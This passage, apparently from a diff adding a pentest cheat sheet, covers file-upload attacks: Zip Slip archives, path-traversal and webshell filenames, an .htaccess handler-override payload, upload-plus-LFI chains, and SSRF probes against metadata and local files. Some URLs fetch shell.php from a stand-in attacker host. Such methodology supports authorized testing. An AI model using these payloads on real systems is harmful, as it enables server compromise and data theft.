+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Useful upload types:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>.xml
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>.svg
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>.docx
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>.xlsx
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>pptx
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>.odt
+</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>fodt
+</span></code></pre></div>
+<p>Check for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>DNS callback
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>HTTP callback
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>XML parser error
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>file content reflected
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>import preview behavior
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>server-side conversion behavior
+</span></code></pre></div>
+<hr />
+<h2 id="archive-upload-testing">Archive Upload Testing</h2>
+<p>Archive upload is useful for file planting, parser bugs, and path traversal during extraction.</p>
+<h3 id="zip-marker">ZIP Marker</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;upload_probe_73921&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>probe.txt
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>zip<span class="w"> </span>probe.zip<span class="w"> </span>probe.txt
+</span></code></pre></div>
+<h3 id="zip-slip-path-traversal">Zip Slip Path Traversal</h3>
+<p>Create entries with traversal paths:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>../probe.txt
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>../../probe.txt
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>../../../var/www/html/probe.txt
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>../../../../tmp/probe.txt
+</span></code></pre></div>
+<p>Manual creation idea:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>zipslip/a
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;upload_probe_73921&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>zipslip/a/probe.txt
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>zip<span class="w"> </span>-r<span class="w"> </span>normal.zip<span class="w"> </span>zipslip
+</span></code></pre></div>
+<p>For exact traversal entry names, use Python:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">zipfile</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s2">&quot;zipslip.zip&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>    <span class="n">z</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="s2">&quot;../../../../tmp/upload_probe_73921.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;upload_probe_73921&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="concatenated-zip-parser-disagreement">Concatenated ZIP Parser Disagreement</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>zip<span class="w"> </span>benign.zip<span class="w"> </span>benign.txt
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>zip<span class="w"> </span>second.zip<span class="w"> </span>probe.txt
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>cat<span class="w"> </span>benign.zip<span class="w"> </span>second.zip<span class="w"> </span>&gt;<span class="w"> </span>combined.zip
+</span></code></pre></div>
+<p>Check whether validation and extraction disagree.</p>
+<h3 id="archive-bomb-dos-note">Archive Bomb / DoS Note</h3>
+<p>Archive bombs can cause service impact. Do not use high-compression or resource-exhaustion tests unless explicitly authorized.</p>
+<hr />
+<h2 id="path-traversal-in-filename">Path Traversal in Filename</h2>
+<p>Test whether the filename is used directly on the filesystem.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>../probe.txt
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>../../probe.txt
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>../../../probe.txt
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>../../../../tmp/probe.txt
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>..%2fprobe.txt
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>..%2f..%2fprobe.txt
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a>..%5cprobe.txt
+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>..%5c..%5cprobe.txt
+</span></code></pre></div>
+<p>Multipart example:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="err">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../tmp/probe.txt&quot;</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="err">Content-Type: text/plain</span>
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="err">upload_probe_73921</span>
+</span></code></pre></div>
+<p>Check for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>file stored outside upload folder
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>path leaked in response
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>different error for traversal
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>overwrite behavior
+</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>temporary file path exposure
+</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>LFI chain possibility
+</span></code></pre></div>
+<hr />
+<h2 id="windows-filename-tricks">Windows Filename Tricks</h2>
+<h3 id="reserved-names">Reserved Names</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>CON
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>PRN
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>AUX
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>NUL
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>COM1
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>COM2
+</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>COM3
+</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a>LPT1
+</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a>LPT2
+</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a>LPT3
+</span></code></pre></div>
+<h3 id="trailing-dots-and-spaces">Trailing Dots and Spaces</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>shell.asp.
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>shell.aspx.
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>shell.php.
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>file.txt.
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>file.txt 
+</span></code></pre></div>
+<h3 id="ntfs-ads">NTFS ADS</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>shell.asp::$data
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>shell.aspx::$data
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>shell.php::$data
+</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>file.asp:.jpg
+</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>file.aspx:.jpg
+</span></code></pre></div>
+<h3 id="invalid-special-characters">Invalid / Special Characters</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>&lt;
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>&gt;
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>:
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>&quot;
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>|
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>?
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>*
+</span></code></pre></div>
+<p>Check for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>normalization
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>truncation
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>alternate stream behavior
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>extension confusion
+</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>unexpected created files
+</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a>error leakage
+</span></code></pre></div>
+<hr />
+<h2 id="server-specific-upload-angles">Server-Specific Upload Angles</h2>
+<h3 id="apache-php">Apache + PHP</h3>
+<p>Interesting extensions:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>.php
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>.phtml
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>.phar
+</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>.pht
+</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>.php5
+</span></code></pre></div>
+<p>Apache may execute files based on handler mappings, not just final extension.</p>
+<p>Test:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>shell.php.jpg
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>shell.jpg.php
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>shell.phtml
+</span></code></pre></div>
+<h3 id="iis-aspnet">IIS / ASP.NET</h3>
+<p>Interesting extensions:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>.asp
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>.aspx
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>.ashx
+</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>.asmx
+</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>.config
+</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a>.cer
+</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>.asa
+</span></code></pre></div>
+<p>IIS legacy tricks:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>shell.aspx;.jpg
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>shell.asp;.jpg
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>shell.aspx::$data
+</span></code></pre></div>
+<h3 id="tomcat-java">Tomcat / Java</h3>
+<p>Interesting extensions:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>.jsp
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>.jspx
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>.war
+</span></code></pre></div>
+<p>High-value upload/import functions:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>plugin upload
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>theme upload
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>WAR deployment
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>report template upload
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>document converter
+</span></code></pre></div>
+<h3 id="nginx-php-fpm">Nginx + PHP-FPM</h3>
+<p>Check for extension/path parsing confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>shell.jpg/anything.php
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>shell.php.jpg
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>shell.jpg%00.php
+</span></code></pre></div>
+<p>Behavior depends heavily on routing and PHP-FPM configuration.</p>
+<hr />
+<h2 id="configuration-file-uploads">Configuration File Uploads</h2>
+<p>Sometimes direct script upload is blocked, but configuration files are accepted or can be planted.</p>
+<h3 id="apache-htaccess">Apache <code>.htaccess</code></h3>
+<p>Filename:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>.htaccess
+</span></code></pre></div>
+<p>Payload idea:</p>
+<div class="language-apache highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="nb">AddType</span><span class="w"> </span>application/x-httpd-php<span class="w"> </span>.jpg
+</span></code></pre></div>
+<p>Then upload:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>shell.jpg
+</span></code></pre></div>
+<h3 id="iis-webconfig">IIS <code>web.config</code></h3>
+<p>Filename:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>web.config
+</span></code></pre></div>
+<p>Use only in labs or when configuration-file execution testing is explicitly in scope.</p>
+<hr />
+<h2 id="upload-lfi-chain">Upload + LFI Chain</h2>
+<p>If direct execution fails, combine upload with Local File Inclusion.</p>
+<p>Flow:</p>
+<ol>
+<li>Upload a file with a unique marker.</li>
+<li>Identify the stored path.</li>
+<li>Confirm LFI exists.</li>
+<li>Include the uploaded file through LFI.</li>
+<li>Check whether the content is interpreted by the backend.</li>
+</ol>
+<p>Example path guesses:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>uploads/probe.txt
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>../uploads/probe.txt
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>../../uploads/probe.txt
+</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>/var/www/html/uploads/probe.txt
+</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a>/tmp/phpXXXXXX
+</span></code></pre></div>
+<p>Example LFI trigger:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>/index.php?page=uploads/probe.txt
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>/index.php?page=../../uploads/probe.txt
+</span></code></pre></div>
+<hr />
+<h2 id="upload-path-disclosure">Upload + Path Disclosure</h2>
+<p>Upload errors often leak useful internals.</p>
+<p>Trigger errors with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>very long filename
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>invalid characters
+</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a>unsupported extension
+</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>large file
+</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a>empty file
+</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a>duplicate filename
+</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a>traversal filename
+</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a>broken image
+</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a>corrupt ZIP
+</span></code></pre></div>
+<p>Look for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>absolute filesystem path
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>framework name
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>storage driver
+</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a>temporary file path
+</span><span id="__span-80-5"><a id="__codelineno-80-5" name="__codelineno-80-5" href="#__codelineno-80-5"></a>image library
+</span><span id="__span-80-6"><a id="__codelineno-80-6" name="__codelineno-80-6" href="#__codelineno-80-6"></a>AV/scanner message
+</span><span id="__span-80-7"><a id="__codelineno-80-7" name="__codelineno-80-7" href="#__codelineno-80-7"></a>object storage bucket
+</span><span id="__span-80-8"><a id="__codelineno-80-8" name="__codelineno-80-8" href="#__codelineno-80-8"></a>CDN path
+</span><span id="__span-80-9"><a id="__codelineno-80-9" name="__codelineno-80-9" href="#__codelineno-80-9"></a>worker/job name
+</span><span id="__span-80-10"><a id="__codelineno-80-10" name="__codelineno-80-10" href="#__codelineno-80-10"></a>stack trace
+</span></code></pre></div>
+<hr />
+<h2 id="upload-object-storage">Upload + Object Storage</h2>
+<p>Modern apps often upload to S3/GCS/Azure Blob through presigned URLs.</p>
+<p>Check:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>Can I control object key?
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>Can I overwrite another object?
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>Can I upload unexpected content type?
+</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>Can I set metadata?
+</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>Can I set public-read ACL?
+</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a>Can I access file without authentication?
+</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#__codelineno-81-7"></a>Can I use path traversal-like keys?
+</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8" href="#__codelineno-81-8"></a>Can I upload HTML/SVG and render it from trusted domain?
+</span><span id="__span-81-9"><a id="__codelineno-81-9" name="__codelineno-81-9" href="#__codelineno-81-9"></a>Can I reuse presigned URL?
+</span><span id="__span-81-10"><a id="__codelineno-81-10" name="__codelineno-81-10" href="#__codelineno-81-10"></a>Can I change filename after signature generation?
+</span></code></pre></div>
+<p>Interesting object keys:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>probe.txt
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>../probe.txt
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>../../probe.txt
+</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a>users/123/avatar.png
+</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a>users/124/avatar.png
+</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>public/probe.html
+</span><span id="__span-82-7"><a id="__codelineno-82-7" name="__codelineno-82-7" href="#__codelineno-82-7"></a>static/probe.svg
+</span></code></pre></div>
+<p>Headers to inspect:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>Content-Type
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>Content-Disposition
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>x-amz-acl
+</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a>x-amz-meta-*
+</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a>x-goog-meta-*
+</span><span id="__span-83-6"><a id="__codelineno-83-6" name="__codelineno-83-6" href="#__codelineno-83-6"></a>x-ms-blob-type
+</span></code></pre></div>
+<hr />
+<h2 id="url-based-upload-import">URL-Based Upload / Import</h2>
+<p>Some apps fetch a remote file from a URL.</p>
+<p>Test:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>https://collaborator.example/upload_probe_73921.png
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>http://127.0.0.1/
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>http://localhost/
+</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a>http://169.254.169.254/
+</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a>file:///etc/passwd
+</span><span id="__span-84-6"><a id="__codelineno-84-6" name="__codelineno-84-6" href="#__codelineno-84-6"></a>gopher://127.0.0.1:80/
+</span></code></pre></div>
+<p>Check for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>DNS callback
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a>HTTP callback
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a>internal service response
+</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a>metadata service attempt
+</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a>stored remote filename
+</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a>redirect handling
+</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7" href="#__codelineno-85-7"></a>content-type trust
+</span><span id="__span-85-8"><a id="__codelineno-85-8" name="__codelineno-85-8" href="#__codelineno-85-8"></a>extension trust from URL path
+</span></code></pre></div>
+<p>Filename confusion example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>https://attacker.example/shell.php?.jpg
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>https://attacker.example/image.jpg/../shell.php
